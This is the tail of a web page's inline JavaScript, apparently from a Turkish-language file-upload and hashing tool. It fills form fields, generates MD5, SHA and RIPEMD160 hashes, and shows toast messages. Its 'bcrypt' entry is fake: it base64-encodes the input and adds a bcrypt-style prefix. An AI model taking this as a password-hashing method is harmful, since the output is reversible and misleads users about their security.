            document.getElementById('fileUploadFolderName').value = folderName;
        });

        document.getElementById('urlUploadForm').addEventListener('submit', function() {
            const folderName = document.getElementById('uploadFolderName').value;
            document.getElementById('urlUploadFolderName').value = folderName;
        });

        function generateHashes() {
            const input = document.getElementById('encryptInput').value;
            if (!input) {
                showToast('Lütfen bir metin girin!', 'warning');
                return;
            }

            const results = document.getElementById('hashResults');
            results.innerHTML = '';

            const md5Hash = CryptoJS.MD5(input).toString();
            const sha1Hash = CryptoJS.SHA1(input).toString();

            const hashes = [
                { name: 'MD5', value: md5Hash },
                { name: 'MD5 (SHA1)', value: CryptoJS.MD5(sha1Hash).toString() },
                { name: 'SHA1', value: sha1Hash },
                { name: 'SHA1 (MD5)', value: CryptoJS.SHA1(md5Hash).toString() },
                { name: 'SHA256', value: CryptoJS.SHA256(input).toString() },
                { name: 'SHA512', value: CryptoJS.SHA512(input).toString() },
                { name: 'SHA3-256', value: CryptoJS.SHA3(input, { outputLength: 256 }).toString() },
                { name: 'SHA3-512', value: CryptoJS.SHA3(input, { outputLength: 512 }).toString() },
                { name: 'RIPEMD160', value: CryptoJS.RIPEMD160(input).toString() },
                { name: 'bcrypt', value: '$2y$10$' + btoa(input).substring(0, 53).replace(/\+/g, '.').replace(/\//g, '.') }
            ];

            hashes.forEach(hash => {
                const div = document.createElement('div');
                div.className = 'hash-result';
                div.innerHTML = `
                    <div>
                        <strong>${hash.name}:</strong><br>
                        <code>${hash.value}</code>
                    </div>
                    <button class="btn btn-sm btn-primary" onclick="copyToClipboard('${hash.value}')">
                        <i class="bi bi-clipboard"></i>
                    </button>
                `;
                results.appendChild(div);
            });
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('Kopyalandı!', 'success');
            }).catch(() => {
                showToast('Kopyalama başarısız!', 'danger');
            });
        }

        function showToast(message, type = 'info') {
            const container = document.querySelector('.toast-container');
            const toast = document.createElement('div');
            toast.className = `toast align-items-center text-white bg-${type} border-0`;
            toast.setAttribute('role', 'alert');
            toast.innerHTML = `
                <div class="d-flex">
                    <div class="toast-body">
                        <i class="bi bi-info-circle"></i> ${message}
                    </div>
                    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
                </div>
            `;
            container.appendChild(toast);
            const bsToast = new bootstrap.Toast(toast);
            bsToast.show();
            toast.addEventListener('hidden.bs.toast', () => {
                toast.remove();
            });
        }
    </script>
</body>
</html>